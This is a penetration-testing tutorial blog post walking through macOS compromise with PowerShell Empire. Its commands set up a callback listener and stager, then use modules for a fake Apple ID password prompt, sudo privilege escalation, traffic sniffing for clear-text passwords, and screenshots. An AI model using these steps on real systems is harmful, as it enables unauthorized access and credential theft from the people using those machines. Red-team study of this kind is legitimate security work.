<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/" rel="category tag">PowerShell Empire</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">OSX Exploitation with Powershell Empire</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/osx-exploitation-with-powershell-empire/" rel="bookmark"><time class="entry-date published" datetime="2019-03-21T05:12:58+00:00">March 21, 2019</time><time class="updated" datetime="2025-05-15T14:09:36+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This article is another post in the Empire series. In this article, we will learn OSX Penetration testing using PowerShell Empire.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Exploiting MAC</strong></span></p>
<p><span style="color: #000000;"><strong>Post Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">Phishing</span></li>
<li><span style="color: #000000;">Privilege Escalation</span></li>
<li><span style="color: #000000;">Sniffing</span></li>
</ul>
<h3><span style="color: #800000;">Exploiting MAC</span></h3>
<p><span style="color: #000000;">Here, I’m assuming you know PowerShell Empire’s basics, therefore, we will create the listener first using the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistener http
set Host //192.168.1.26
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-_fKSHUFpc6I/XJMbAJplkwI/AAAAAAAAdoA/gyc_dFn6UGoSWVAA0J6mcCioy2WgToOyQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Executing the above commands will start up the listener as shown in the image above. Now the next step is to create a stage for OS X. And for that, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager osx/launcher
execute</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-buff8GZSMT0/XJMbAGOI-CI/AAAAAAAAdoE/9_Je_O_s2uobrxO-s0XB9m8WjyQQHQhRACLcBGAs/s1600/2.png" alt="OSX Exploitation with PowerShell Empire" width="898" height="189"/></span></p>
<p><span style="color: #000000;">As you can see in the image above, the above stager will generate a code. Execute this code in the target system i.e. OS X and after the execution, you will have your session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-t9Qe0_w_r7g/XJMbA7KVHQI/AAAAAAAAdoM/z3SMbSozwtIRD6JPXLukY2FRmPiBLGaNwCLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Post Exploitation</span></h3>
<h4><span style="color: #000000;">Phishing</span></h4>
<p><span style="color: #000000;">As we have the session of our Mac, a few post-exploits can be used to our advantage. For instance, the first post-exploitation module we can use is <strong data-start="148" data-end="173">collection/osx/prompt</strong>. This module will ask the user to enter their Apple ID password. However, it is important to note that this module does not operate in stealth mode :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule collection/osx/prompt
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-m2DVn0HtgPg/XJMbBL7fTLI/AAAAAAAAdoQ/ZT6mgiOencUpWw7vau8EVfHt223GUvxnQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Executing the above module will open a prompt in the target machine as shown in the image below, and when you enter the password you have it in clear text as shown in the image above.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-N1Juswq480s/XJMbBY3FFxI/AAAAAAAAdoU/qeUErYw-C6kn7TnQW0MrEEhTZlYzf5C9QCLcBGAs/s1600/5.1.png" alt="OSX Exploitation with PowerShell Empire" width="804" height="384"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">For the privilege escalation of OS X, we have used the module privesc/multi/sudo_spawn. To use this module type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule privesc/multi/sudo_spawn
set Listener http
set Password toor
execute</pre>
<p><span style="color: #000000;">Executing this module will give you admin rights with a new session, as you can see in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//4.bp.blogspot.com/-7gEAS0-M5qY/XJMbBwRV0iI/AAAAAAAAdoY/gXSRWMoKeDEHOsyOMBvFJa_Kt-jBh4wZACLcBGAs/s1600/5.png" alt="OSX Exploitation with PowerShell Empire" width="941" height="651"/></span></p>
<h3><span style="color: #800000;">Sniffing</span></h3>
<p><span style="color: #000000;">The module we will use is collection/osx/sniffer. This will sniff around all the traffic coming to and going from our target system and give us all the necessary details by creating a pcap file.  To use the module type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule collection/osx/sniffer
execute</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-4i2EkZ6DuMs/XJMbB4YqwFI/AAAAAAAAdoc/lRxkEoX-4fQ9PdiL0jsd_IkKtxsZMmAQACLcBGAs/s1600/6.png" alt="OSX Exploitation with PowerShell Empire" width="778" height="246"/></span></p>
<p><span style="color: #000000;">As you can see, that you will even find the password in clear text in the pcap file as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-sI3c4sXWPXE/XJMbCIALlLI/AAAAAAAAdog/E6-_g7OTzNUal0DLMawFWkTHSvKx8G39wCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then, post module is of taking a screenshot of the target system and using the said module type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule collection/osx/screenshot
execute</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-ibraIpbOsCw/XJMbCVLfnUI/AAAAAAAAdok/njSwjcM4f6QkDF8_Pm_9KGiUq7AQTPNcgCLcBGAs/s1600/8.png" alt="OSX Exploitation with PowerShell Empire" width="802" height="243"/></span></p>
<p><span style="color: #000000;">The above module will take a screenshot as shown in the image below :</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-ugGqPITELG8/XJMbDI1PtPI/AAAAAAAAdoo/0HQyhWt2zCkNrMiV0VXNkP4EZIyCSDh3QCLcBGAs/s1600/9.png" alt="OSX Exploitation with PowerShell Empire" width="796" height="559"/></span></p>
<p><span style="color: #000000;">There is a further number of post modules which you can use and experiment with as shown in the image below :</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-vqLQawtP3S4/XJMbAWau3oI/AAAAAAAAdoI/M_MtneqozgsKwbwDGExXY9XjFAmbmWJHACLcBGAs/s1600/10.png" alt="OSX Exploitation with PowerShell Empire" width="1245" height="739"/></span></p>
<p><span style="color: #000000;"><span class="relative -mx-px my-[-0.2rem] rounded px-px py-[0.2rem] transition-colors duration-100 ease-in-out">The article on <strong>OSX Exploitation with PowerShell Empire</strong> demonstrates how attackers can leverage PowerShell Empire to gain unauthorized access to macOS systems. It explains how modules for phishing, privilege escalation, and network sniffing can be used to effectively compromise and control target machines. Therefore, understanding these techniques is crucial for cybersecurity professionals aiming to detect and mitigate such threats.</span></span></p>
<p><span style="color: #000000;">To learn more about PowerShell. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sanjeet Kumar is an Information Security Analyst | Pentester | and Researcher. Contact <a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
